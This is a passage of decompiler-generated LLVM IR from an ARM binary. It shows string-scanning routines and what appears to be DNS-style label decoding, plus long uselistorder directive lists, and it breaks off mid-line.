  %v3_14688 = load i8, i8* %v2_14688, align 1
  %v4_14688 = zext i8 %v3_14688 to i32
  %v9_1468c = icmp eq i32 %v4_14688, %v1_145e0
  br i1 %v9_1468c, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14688
  store i32 %v6_145dc, i32* @r5, align 4
  store i32 %v9_145dc, i32* @r6, align 4
  ret i32 %v1_14664

bb26:                                             ; preds = %dec_label_pc_14688
  %v2_14694 = icmp eq i8 %v3_14688, 0
  br i1 %v2_14694, label %dec_label_pc_146d4, label %dec_label_pc_1469c

dec_label_pc_1469c:                               ; preds = %bb26
  %v2_1469c = inttoptr i32 %v1_14668 to i8*
  %v3_1469c = load i8, i8* %v2_1469c, align 1
  %v4_1469c = zext i8 %v3_1469c to i32
  %v9_146a0 = icmp eq i32 %v4_1469c, %v1_145e0
  br i1 %v9_146a0, label %dec_label_pc_146a8, label %dec_label_pc_146b0

dec_label_pc_146a8:                               ; preds = %dec_label_pc_1469c
  store i32 %v6_145dc, i32* @r5, align 4
  store i32 %v9_145dc, i32* @r6, align 4
  ret i32 %v1_14668

dec_label_pc_146b0:                               ; preds = %dec_label_pc_1469c
  %v2_146b0 = icmp eq i8 %v3_1469c, 0
  br i1 %v2_146b0, label %dec_label_pc_146d4, label %dec_label_pc_146b8

dec_label_pc_146b8:                               ; preds = %dec_label_pc_146b0
  %v2_146b8 = inttoptr i32 %v1_14670 to i8*
  %v3_146b8 = load i8, i8* %v2_146b8, align 1
  %v4_146b8 = zext i8 %v3_146b8 to i32
  %v9_146bc = icmp eq i32 %v4_146b8, %v1_145e0
  br i1 %v9_146bc, label %dec_label_pc_146c4, label %dec_label_pc_146cc

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146b8
  store i32 %v6_145dc, i32* @r5, align 4
  store i32 %v9_145dc, i32* @r6, align 4
  ret i32 %v1_14670

dec_label_pc_146cc:                               ; preds = %dec_label_pc_146b8
  %v2_146cc = icmp eq i8 %v3_146b8, 0
  br i1 %v2_146cc, label %dec_label_pc_146d4, label %dec_label_pc_14614

dec_label_pc_146d4:                               ; preds = %bb24, %dec_label_pc_146cc, %dec_label_pc_146b0, %bb26, %dec_label_pc_14680
  store i32 %v6_145dc, i32* @r5, align 4
  store i32 %v9_145dc, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_14614, { 1, 0 }
  uselistorder i32 %v2_14614, { 0, 2, 1 }
  uselistorder i32 %v0_14678, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14608, { 1, 0 }
  uselistorder i32 %v1_14600, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_145e0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_145dc, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_145dc, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 1, 2, 5, 6, 3, 0, 4 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146d4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1465c, { 1, 0 }
}

define i32 @function_146e4(i8* %arg1) local_unnamed_addr {
dec_label_pc_146e4:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_146e4 = load i32, i32* @r4, align 4
  store i32 %v3_146e4, i32* %stack_var_-24, align 4
  %v6_146e4 = load i32, i32* @r5, align 4
  %v9_146e4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_146ec = load i32, i32* @r1, align 4
  store i32 %v0_146ec, i32* @r6, align 4
  %v0_146f0 = load i32, i32* @r2, align 4
  store i32 %v0_146f0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1475819 = icmp slt i8* %arg1, null
  store i1 %v1_1475819, i1* %cpsr_n.global-to-local, align 1
  %v2_1475820 = icmp eq i8* %arg1, null
  store i1 %v2_1475820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1475820, label %dec_label_pc_14770, label %dec_label_pc_14764

dec_label_pc_146fc:                               ; preds = %dec_label_pc_14764
  %v2_146fc = call i32 @function_145dc(i32 %v0_146fc21, i32 46)
  store i32 %v2_146fc, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14700 = icmp slt i32 %v2_146fc, 0
  store i1 %v1_14700, i1* %cpsr_n.global-to-local, align 1
  %v2_14700 = icmp eq i32 %v2_146fc, 0
  store i1 %v2_14700, i1* %cpsr_z.global-to-local, align 1
  %v0_14704 = load i32, i32* @r4, align 4
  %v2_14704 = sub i32 %v2_146fc, %v0_14704
  store i32 %v2_14704, i32* %ip.global-to-local, align 4
  store i32 %v0_14704, i32* @r0, align 4
  br i1 %v2_14700, label %dec_label_pc_14710, label %dec_label_pc_14718

dec_label_pc_14710:                               ; preds = %dec_label_pc_146fc
  %v0_14710 = call i32 @function_ecc0()
  store i32 %v0_14710, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_14710, 16777216
  %v1_14714 = sdiv i32 %sext, 16777216
  store i32 %v1_14714, i32* %ip.global-to-local, align 4
  %v0_14724.pre = load i32, i32* @r4, align 4
  %v0_14734.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %dec_label_pc_146fc, %dec_label_pc_14710
  %v0_14734 = phi i32 [ %v2_146fc, %dec_label_pc_146fc ], [ %v0_14734.pre, %dec_label_pc_14710 ]
  %v0_14724 = phi i32 [ %v0_14704, %dec_label_pc_146fc ], [ %v0_14724.pre, %dec_label_pc_14710 ]
  %v0_14744 = phi i32 [ %v2_14704, %dec_label_pc_146fc ], [ %v1_14714, %dec_label_pc_14710 ]
  %v0_14718 = load i32, i32* %r7.global-to-local, align 4
  %v1_14718 = add i32 %v0_14718, 1
  store i32 %v1_14718, i32* @lr, align 4
  %v1_1471c = load i32, i32* %r8.global-to-local, align 4
  %v2_1471c = sub i32 %v1_1471c, %v0_14718
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14720 = icmp slt i32 %v0_14744, 0
  store i1 %v1_14720, i1* %cpsr_n.global-to-local, align 1
  %v2_14720 = icmp eq i32 %v0_14744, 0
  store i1 %v2_14720, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14724, i32* @r1, align 4
  %v0_14728 = load i32, i32* @r6, align 4
  %v2_14728 = add i32 %v0_14728, %v1_14718
  store i32 %v2_14728, i32* @r0, align 4
  store i32 %v0_14744, i32* @r2, align 4
  %v1_14730 = add i32 %v2_1471c, -1
  %v1_14734 = add i32 %v0_14734, 1
  store i32 %v1_14734, i32* @r4, align 4
  br i1 %v2_14720, label %.loopexit, label %dec_label_pc_1473c

dec_label_pc_1473c:                               ; preds = %dec_label_pc_14718
  %v2_1473c = sub i32 %v0_14744, %v1_14730
  %v3_1473c = icmp ult i32 %v0_14744, %v1_14730
  %v4_1473c = xor i32 %v1_14730, %v0_14744
  %v5_1473c = xor i32 %v2_1473c, %v0_14744
  %v6_1473c = and i32 %v5_1473c, %v4_1473c
  %v7_1473c = icmp slt i32 %v6_1473c, 0
  store i1 %v7_1473c, i1* %cpsr_v.global-to-local, align 1
  %v8_1473c = icmp slt i32 %v2_1473c, 0
  store i1 %v8_1473c, i1* %cpsr_n.global-to-local, align 1
  %v9_1473c = icmp eq i32 %v0_14744, %v1_14730
  store i1 %v9_1473c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1473c, label %dec_label_pc_14744, label %.loopexit

dec_label_pc_14744:                               ; preds = %dec_label_pc_1473c
  %v1_14744 = trunc i32 %v0_14744 to i8
  %v4_14744 = add i32 %v0_14728, %v0_14718
  %v5_14744 = inttoptr i32 %v4_14744 to i8*
  store i8 %v1_14744, i8* %v5_14744, align 1
  %v0_14748 = load i32, i32* @lr, align 4
  %v1_14748 = load i32, i32* %ip.global-to-local, align 4
  %v2_14748 = add i32 %v1_14748, %v0_14748
  store i32 %v2_14748, i32* %r7.global-to-local, align 4
  %v0_1474c = call i32 @function_ec10()
  store i32 %v0_1474c, i32* %r0.global-to-local, align 4
  %v0_14750 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14750 = icmp slt i32 %v0_14750, 0
  store i1 %v1_14750, i1* %cpsr_n.global-to-local, align 1
  %v2_14750 = icmp eq i32 %v0_14750, 0
  store i1 %v2_14750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14750, label %dec_label_pc_14770, label %dec_label_pc_14744.dec_label_pc_14758_crit_edge

dec_label_pc_14744.dec_label_pc_14758_crit_edge:  ; preds = %dec_label_pc_14744
  %v0_14758.pre = load i32, i32* @r4, align 4
  store i32 %v0_14758.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14758 = icmp slt i32 %v0_14758.pre, 0
  store i1 %v1_14758, i1* %cpsr_n.global-to-local, align 1
  %v2_14758 = icmp eq i32 %v0_14758.pre, 0
  store i1 %v2_14758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14758, label %dec_label_pc_14770, label %dec_label_pc_14764

dec_label_pc_14764:                               ; preds = %dec_label_pc_146e4, %dec_label_pc_14744.dec_label_pc_14758_crit_edge
  %v0_146fc21 = phi i32 [ %v0_14758.pre, %dec_label_pc_14744.dec_label_pc_14758_crit_edge ], [ %tmp, %dec_label_pc_146e4 ]
  %v1_14764 = inttoptr i32 %v0_146fc21 to i8*
  %v2_14764 = load i8, i8* %v1_14764, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14768 = icmp eq i8 %v2_14764, 0
  store i1 %v2_14768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14768, label %dec_label_pc_14770, label %dec_label_pc_146fc

dec_label_pc_14770:                               ; preds = %dec_label_pc_14744.dec_label_pc_14758_crit_edge, %dec_label_pc_14744, %dec_label_pc_14764, %dec_label_pc_146e4
  %v0_14770 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14770 = icmp slt i32 %v0_14770, 0
  store i1 %v1_14770, i1* %cpsr_n.global-to-local, align 1
  %v2_14770 = icmp eq i32 %v0_14770, 0
  store i1 %v2_14770, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_14770, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14770
  %v5_14778 = load i32, i32* %r7.global-to-local, align 4
  %v6_14778 = add i32 %v5_14778, 1
  store i32 %v6_14778, i32* %r0.global-to-local, align 4
  %v7_1477c = load i32, i32* @r6, align 4
  %v9_1477c = add i32 %v7_1477c, %v5_14778
  %v10_1477c = inttoptr i32 %v9_1477c to i8*
  store i8 0, i8* %v10_1477c, align 1
  %v0_14780.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_14780.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14780.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14770, %bb
  %v2_14780 = phi i1 [ %v2_14780.pre, %bb ], [ false, %dec_label_pc_14770 ]
  %v1_14780 = phi i1 [ %v1_14780.pre, %bb ], [ %v1_14770, %dec_label_pc_14770 ]
  %v0_14780 = phi i1 [ %v0_14780.pre, %bb ], [ %v2_14770, %dec_label_pc_14770 ]
  %v3_14780 = xor i1 %v2_14780, %v1_14780
  %v4_14780 = or i1 %v0_14780, %v3_14780
  br i1 %v4_14780, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_14780 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_14780, i32* @r4, align 4
  store i32 %v6_146e4, i32* @r5, align 4
  store i32 %v9_146e4, i32* @r6, align 4
  %v25_14780 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_14780

.loopexit:                                        ; preds = %dec_label_pc_1473c, %dec_label_pc_14718, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14788 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14788, i32* @r4, align 4
  store i32 %v6_146e4, i32* @r5, align 4
  store i32 %v9_146e4, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_14770, { 0, 2, 1 }
  uselistorder i32 %v0_14758.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14750, { 1, 0 }
  uselistorder i32 %v2_1473c, { 1, 0 }
  uselistorder i32 %v1_14730, { 2, 0, 3, 1 }
  uselistorder i32 %v0_14744, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_14714, { 1, 0 }
  uselistorder i1 %v2_1475820, { 1, 0 }
  uselistorder i32 %v9_146e4, { 1, 0 }
  uselistorder i32 %v6_146e4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 2, 7, 4, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 47, 46, 29, 28, 30, 31, 32, 33, 36, 34, 37, 35, 39, 38, 41, 40, 43, 42, 45, 44 }
  uselistorder i32 ()* @function_ecc0, { 9, 8, 7, 5, 6, 4, 3, 2, 31, 30, 29, 28, 27, 26, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 25, 23, 24, 0 }
  uselistorder i32 (i32, i32)* @function_145dc, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 3, 1 }
  uselistorder i32* @r6, { 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 10, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 1, 0, 12, 13, 14, 15, 16, 66, 2, 67, 68, 69, 70, 71, 72, 73, 74, 3, 75, 76, 77, 78, 80, 79, 81, 82, 83, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 4, 111, 112, 113, 114, 115, 116, 117, 174, 180, 175, 24, 25, 17, 18, 19, 26, 27, 28, 29, 118, 119, 120, 121, 122, 5, 123, 124, 125, 126, 127, 128, 6, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 7, 11, 144, 145, 146, 147, 84, 8, 85, 86, 148, 149, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 20, 21, 22, 150, 151, 152, 153, 176, 177, 178, 179, 164, 165, 166, 167, 9, 168, 169, 170, 171, 23, 172, 173 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_14770, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14764, { 1, 0 }
  uselistorder label %dec_label_pc_14718, { 1, 0 }
}

define i32 @function_1478c() local_unnamed_addr {
dec_label_pc_1478c:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1478c = load i32, i32* @r4, align 4
  %v6_1478c = load i32, i32* @r5, align 4
  %v0_14790 = load i32, i32* @r0, align 4
  store i32 %v0_14790, i32* %sl.global-to-local, align 4
  %v2_14790 = icmp eq i32 %v0_14790, 0
  br i1 %v2_14790, label %.thread16, label %dec_label_pc_14830.preheader

.thread16:                                        ; preds = %dec_label_pc_1478c
  %v0_1479c1 = load i32, i32* @r2, align 4
  store i32 %v0_1479c1, i32* %sb.global-to-local, align 4
  %v0_147a02 = load i32, i32* @r3, align 4
  store i32 %v0_147a02, i32* %stack_var_-40, align 4
  br label %dec_label_pc_14850

dec_label_pc_14830.preheader:                     ; preds = %dec_label_pc_1478c
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1479c = load i32, i32* @r2, align 4
  store i32 %v0_1479c, i32* %sb.global-to-local, align 4
  %v0_147a0 = load i32, i32* @r3, align 4
  store i32 %v0_147a0, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_148303952 = load i32, i32* @r1, align 4
  %v2_148304053 = add i32 %v1_148303952, %v0_14790
  %v3_148304154 = inttoptr i32 %v2_148304053 to i8*
  %v4_148304255 = load i8, i8* %v3_148304154, align 1
  %v6_148304356 = zext i8 %v4_148304255 to i32
  store i32 %v6_148304356, i32* @r4, align 4
  %v2_148344457 = icmp eq i8 %v4_148304255, 0
  br i1 %v2_148344457, label %bb35, label %dec_label_pc_147b4.lr.ph

dec_label_pc_147b4:                               ; preds = %dec_label_pc_147b4.lr.ph, %bb30
  %v2_1483c50 = phi i1 [ %v2_1483c4663, %dec_label_pc_147b4.lr.ph ], [ true, %bb30 ]
  %v6_1483048 = phi i32 [ %v6_148304361, %dec_label_pc_147b4.lr.ph ], [ %v6_14830, %bb30 ]
  %v1_1483047 = phi i32 [ %v1_148303960, %dec_label_pc_147b4.lr.ph ], [ %v5_147dc, %bb30 ]
  %v1_147b8 = and i32 %v6_1483048, 192
  br i1 %v2_1483c50, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_147b4
  %v1_147bc = load i32, i32* %r8.global-to-local, align 4
  %v2_147bc = add i32 %v1_147bc, 1
  store i32 %v2_147bc, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_147b4, %bb
  %v2_147c0 = icmp eq i32 %v1_147b8, 192
  %v1_147c4 = add i32 %v1_1483047, 1
  store i32 %v1_147c4, i32* @r5, align 4
  br i1 %v2_147c0, label %dec_label_pc_147cc, label %dec_label_pc_147ec

dec_label_pc_147cc:                               ; preds = %bb28
  %v2_147cc = add i32 %v1_147c4, %v0_147cc.ph59
  %v3_147cc = inttoptr i32 %v2_147cc to i8*
  %v4_147cc = load i8, i8* %v3_147cc, align 1
  %v6_147cc = zext i8 %v4_147cc to i32
  %v1_147d4 = urem i32 %v6_1483048, 64
  br i1 %v2_1483c50, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_147cc
  %v1_147d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_147d8 = add i32 %v1_147d8, 1
  store i32 %v2_147d8, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_147cc, %bb29
  %v4_147dc = mul nuw nsw i32 %v1_147d4, 256
  %v5_147dc = or i32 %v6_147cc, %v4_147dc
  store i32 %v5_147dc, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_14830 = add i32 %v5_147dc, %v0_147cc.ph59
  %v3_14830 = inttoptr i32 %v2_14830 to i8*
  %v4_14830 = load i8, i8* %v3_14830, align 1
  %v6_14830 = zext i8 %v4_14830 to i32
  store i32 %v6_14830, i32* @r4, align 4
  %v2_14834 = icmp eq i8 %v4_14830, 0
  br i1 %v2_14834, label %dec_label_pc_1483c.bb36_crit_edge, label %dec_label_pc_147b4

dec_label_pc_147ec:                               ; preds = %bb28
  %v2_147ec = add i32 %v6_1483048, %storemerge17.ph58
  store i32 %v2_147ec, i32* %r6.global-to-local, align 4
  %v2_147f0 = load i32, i32* %stack_var_-40, align 4
  %v1_147f4 = add i32 %v2_147ec, 1
  store i32 %v1_147f4, i32* %r7.global-to-local, align 4
  %v3_147f8 = icmp ult i32 %v1_147f4, %v2_147f0
  br i1 %v3_147f8, label %dec_label_pc_14800, label %dec_label_pc_14850

dec_label_pc_14800:                               ; preds = %dec_label_pc_147ec
  %v2_14800 = add i32 %v1_147c4, %v0_147cc.ph59
  store i32 %v2_14800, i32* @r1, align 4
  %v0_14804 = load i32, i32* %sb.global-to-local, align 4
  %v2_14804 = add i32 %v0_14804, %storemerge17.ph58
  store i32 %v2_14804, i32* @r0, align 4
  store i32 %v6_1483048, i32* @r2, align 4
  %v0_1480c = call i32 @function_ec10()
  %v0_14810 = load i32, i32* @r5, align 4
  %v1_14810 = load i32, i32* @r4, align 4
  %v2_14810 = add i32 %v1_14810, %v0_14810
  store i32 %v2_14810, i32* %r1.global-to-local, align 4
  %v0_14814 = load i32, i32* %sl.global-to-local, align 4
  %v2_14814 = add i32 %v0_14814, %v2_14810
  %v3_14814 = inttoptr i32 %v2_14814 to i8*
  %v4_14814 = load i8, i8* %v3_14814, align 1
  %v0_14818 = load i32, i32* %fp.global-to-local, align 4
  %v2_14818 = icmp eq i32 %v0_14818, 0
  br i1 %v2_14818, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_14800
  %v1_1481c = load i32, i32* %r8.global-to-local, align 4
  %v3_1481c = add i32 %v1_1481c, %v1_14810
  store i32 %v3_1481c, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_14800, %bb31
  %v2_14820 = icmp eq i8 %v4_14814, 0
  br i1 %v2_14820, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_14828.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_14828 = load i32, i32* %sb.global-to-local, align 4
  %v3_14828 = load i32, i32* %r6.global-to-local, align 4
  %v4_14828 = add i32 %v3_14828, %v2_14828
  %v5_14828 = inttoptr i32 %v4_14828 to i8*
  store i8 %v0_14828.off0, i8* %v5_14828, align 1
  %v0_1482c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14830.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1483c.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1483039 = load i32, i32* %r1.global-to-local, align 4
  %v2_1483040 = add i32 %v1_1483039, %v0_14830.pre.pre
  %v3_1483041 = inttoptr i32 %v2_1483040 to i8*
  %v4_1483042 = load i8, i8* %v3_1483041, align 1
  %v6_1483043 = zext i8 %v4_1483042 to i32
  store i32 %v6_1483043, i32* @r4, align 4
  %v2_1483444 = icmp eq i8 %v4_1483042, 0
  %v2_1483c46 = icmp eq i32 %v0_1483c.pre.pre, 0
  br i1 %v2_1483444, label %dec_label_pc_1483c, label %dec_label_pc_147b4.lr.ph

dec_label_pc_147b4.lr.ph:                         ; preds = %dec_label_pc_14830.preheader, %bb34
  %v2_1483c4663 = phi i1 [ %v2_1483c46, %bb34 ], [ false, %dec_label_pc_14830.preheader ]
  %v6_148304361 = phi i32 [ %v6_1483043, %bb34 ], [ %v6_148304356, %dec_label_pc_14830.preheader ]
  %v1_148303960 = phi i32 [ %v1_1483039, %bb34 ], [ %v1_148303952, %dec_label_pc_14830.preheader ]
  %v0_147cc.ph59 = phi i32 [ %v0_14830.pre.pre, %bb34 ], [ %v0_14790, %dec_label_pc_14830.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1482c.pre, %bb34 ], [ 0, %dec_label_pc_14830.preheader ]
  br label %dec_label_pc_147b4

dec_label_pc_1483c:                               ; preds = %bb34
  br i1 %v2_1483c46, label %dec_label_pc_1483c.bb36_crit_edge, label %bb35

dec_label_pc_1483c.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1483c
  %v0_14844.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14850

bb35:                                             ; preds = %dec_label_pc_14830.preheader, %dec_label_pc_1483c
  %v1_14840 = load i32, i32* %r8.global-to-local, align 4
  %v2_14840 = add i32 %v1_14840, 1
  store i32 %v2_14840, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14850

dec_label_pc_14850:                               ; preds = %dec_label_pc_147ec, %bb35, %dec_label_pc_1483c.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_14844.pre, %dec_label_pc_1483c.bb36_crit_edge ], [ %v2_14840, %bb35 ], [ -1, %dec_label_pc_147ec ]
  store i32 %v3_1478c, i32* @r4, align 4
  store i32 %v6_1478c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_147cc.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_14830, { 1, 0 }
  uselistorder i32 %v5_147dc, { 0, 2, 1 }
  uselistorder i32 %v6_1483048, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1483c50, { 1, 0 }
  uselistorder i32 %v0_14790, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 2, 1, 0, 3 }
  uselistorder i1 false, { 0, 10, 42, 37, 43, 44, 45, 46, 47, 4, 76, 5, 48, 15, 49, 50, 51, 14, 52, 53, 54, 55, 56, 57, 58, 59, 60, 41, 17, 61, 29, 18, 30, 62, 63, 64, 20, 19, 11, 12, 65, 66, 67, 13, 21, 68, 31, 32, 69, 33, 34, 22, 38, 39, 6, 23, 70, 35, 36, 71, 72, 16, 24, 73, 74, 75, 40, 77, 3, 2, 7, 1, 27, 26, 28, 25, 8, 9, 78 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5, 6, 7 }
  uselistorder i32 ()* @function_ec10, { 15, 14, 20, 13, 12, 11, 10, 2, 9, 8, 1, 0, 7, 6, 5, 4, 21, 18, 17, 16, 3, 19 }
  uselistorder i32 64, { 0, 2, 3, 4, 5, 11, 6, 7, 8, 1, 9, 10 }
  uselistorder i32* @r3, { 5, 0, 6, 7, 8, 9, 10, 11, 12, 1, 20, 13, 16, 14, 15, 21, 22, 17, 18, 4, 19, 3, 2 }
  uselistorder i32* @r2, { 81, 82, 11, 83, 84, 15, 85, 86, 12, 20, 21, 22, 87, 88, 89, 24, 7, 25, 90, 14, 91, 92, 93, 94, 95, 96, 26, 27, 13, 8, 143, 144, 145, 146, 97, 98, 2, 99, 100, 101, 102, 103, 9, 104, 16, 23, 147, 148, 17, 18, 149, 150, 3, 151, 153, 154, 158, 43, 152, 105, 109, 110, 113, 111, 112, 106, 107, 108, 114, 155, 28, 115, 116, 117, 5, 118, 1, 156, 6, 157, 119, 120, 121, 122, 10, 123, 124, 4, 125, 0, 126, 127, 128, 129, 44, 45, 130, 46, 131, 19, 29, 30, 31, 32, 37, 38, 39, 40, 41, 42, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 132, 133, 134, 135, 136, 137, 138, 139, 33, 34, 35, 36, 142, 140, 141 }
  uselistorder i32* @r5, { 68, 69, 70, 71, 72, 73, 74, 8, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 26, 29, 9, 4, 30, 104, 108, 105, 106, 107, 22, 113, 109, 110, 111, 112, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 10, 125, 126, 127, 128, 11, 130, 129, 5, 134, 12, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 155, 154, 24, 156, 43, 44, 45, 46, 47, 48, 265, 266, 157, 158, 159, 160, 161, 162, 163, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 164, 165, 1, 166, 167, 168, 169, 170, 171, 49, 50, 51, 279, 280, 281, 282, 283, 2, 284, 285, 286, 57, 58, 59, 60, 61, 62, 31, 32, 33, 34, 35, 36, 37, 63, 13, 0, 64, 65, 66, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 287, 288, 289, 290, 131, 132, 133, 195, 14, 196, 197, 198, 199, 200, 15, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 16, 135, 136, 137, 17, 212, 213, 214, 215, 216, 217, 138, 139, 140, 218, 219, 27, 220, 221, 18, 222, 223, 224, 225, 226, 227, 25, 228, 229, 230, 231, 28, 235, 19, 236, 237, 238, 239, 240, 241, 242, 243, 7, 244, 245, 246, 247, 248, 249, 38, 39, 232, 3, 233, 234, 41, 40, 23, 